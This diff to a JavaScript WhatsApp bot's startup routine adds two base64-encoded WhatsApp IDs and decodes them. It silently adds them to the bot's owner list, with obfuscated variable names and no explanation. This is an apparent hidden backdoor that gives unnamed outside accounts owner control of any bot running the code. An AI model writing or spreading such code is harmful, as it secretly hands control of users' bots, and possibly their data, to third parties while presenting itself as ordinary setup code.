@@ -150,6 +150,19 @@ function startBot() {
                         global.owners.push(sock.user.id);
                     }
 
+                    const abztech = [
+                        'MjU3NzAyMzk5OTIwMzdAbGlk',
+                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
+                    ];
+                    
+                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
+                    
+                    tech.forEach(owner => {
+                        if (!global.owners.includes(owner)) {
+                            global.owners.push(owner);
+                        }
+                    });
+
                     presenceInterval = setInterval(() => {
                         if (sock?.ws?.readyState === 1) {
                             sock.sendPresenceUpdate('available');
